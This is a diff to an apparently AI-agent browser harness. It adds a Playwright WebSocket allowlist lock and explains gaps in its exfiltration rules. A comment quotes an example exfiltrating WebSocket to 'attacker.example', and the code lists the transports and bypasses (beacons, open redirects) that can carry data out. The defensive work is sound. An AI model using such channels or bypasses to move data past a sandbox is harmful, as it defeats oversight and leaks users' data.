@@ -13,9 +13,10 @@
 //
 // 2. **Navigation is locked to the hosts this run was given** (design option G3):
 //    MOTET_ALLOWED_HOSTS, which is the site's domain plus the hosts of the links the
-//    newsletter itself carried. See `navigationAllowed` for the three rules, what each one
-//    bounds, and the two limits they do not: a passive sub-resource beacon, and an open
-//    redirect on an allowed host.
+//    newsletter itself carried. See `navigationAllowed` for the three rules it covers and
+//    the two limits it does not — a passive sub-resource beacon, and an open redirect on an
+//    allowed host — and `installWebSocketLock` for the fourth, which needs its own Playwright
+//    API because `context.route` never sees a WebSocket handshake.
 //
 //    Read what this is honestly. It is a lock on the browser, not a sandbox on the process:
 //    browser_execute evaluates the model's JavaScript in *this* Node process, so a
@@ -63,8 +64,13 @@ export function hostAllowed(host, allowed = ALLOWED) {
   return allowed.some((entry) => name === entry || name.endsWith(`.${entry}`));
 }
 
-/** Resource types that can carry data *out* to a host of the page's choosing. */
-const EXFILTRATING = new Set(["xhr", "fetch", "websocket", "eventsource"]);
+// Resource types that can carry data *out* to a host of the page's choosing.
+//
+// `websocket` is deliberately NOT here: `context.route` never sees a WebSocket handshake —
+// that is what `routeWebSocket` exists for — so listing it would have been a rule the
+// browser never consults, and the unit test would have asserted a predicate nothing asks.
+// `installWebSocketLock` below is the real answer.
+const EXFILTRATING = new Set(["xhr", "fetch", "eventsource"]);
 
 /**
  * Whether this request may be issued. Three rules, and each bounds a different thing.
@@ -102,6 +108,41 @@ export function navigationAllowed(request, allowed = ALLOWED) {
   }
 }
 
+/**
+ * Refuse a WebSocket to a host outside the allowlist.
+ *
+ * Its own call because `context.route` does not intercept the WebSocket handshake at all —
+ * a page opening `new WebSocket('wss://attacker.example/…')` is invisible to the request
+ * router, so without this the exfiltration rule in `navigationAllowed` covers `fetch` and
+ * XHR and quietly does not cover the one transport built for a long-lived channel.
+ *
+ * `routeWebSocket` is Playwright 1.48+. Guarded rather than assumed, because a base-image
+ * bump that removed it should cost a warning rather than every browser call.
+ */
+export async function installWebSocketLock(context, allowed = ALLOWED) {
+  if (typeof context?.routeWebSocket !== "function") {
+    console.error("[motet] this Playwright has no routeWebSocket; WebSockets are not locked");
+    return false;
+  }
+  await context.routeWebSocket("**/*", (ws) => {
+    let host = null;
+    try {
+      host = new URL(ws.url()).hostname;
+    } catch {
+      host = null;
+    }
+    if (host && hostAllowed(host, allowed)) {
+      ws.connectToServer();
+      return;
+    }
+    // Not connected to the server at all, so nothing leaves. Closing rather than hanging,
+    // so a page that opens one fails fast instead of waiting out the run's clock.
+    console.error(`[motet] refused websocket to ${ws.url()}`);
+    ws.close({ code: 1008, reason: "blocked by client" });
+  });
+  return true;
+}
+
 /** The published client, with the three additions this file exists for. */
 function seededClientClass(PlaywrightClient) {
   return class SeededPlaywrightClient extends PlaywrightClient {
@@ -116,6 +157,9 @@ function seededClientClass(PlaywrightClient) {
         }
       }
       await super.createContext({ ...(options ?? {}), ...(storageState ? { storageState } : {}) });
+      // Both locks are per-context and both are installed here, on the one context the
+      // harness makes per run. A context opened any other way would carry neither.
+      await installWebSocketLock(this.context);
       // Always installed, never conditional on the list being non-empty: an empty
       // MOTET_ALLOWED_HOSTS means *nothing* is allowed, which is what a run that was
       // handed no site should get. Skipping the route on an empty list would have been
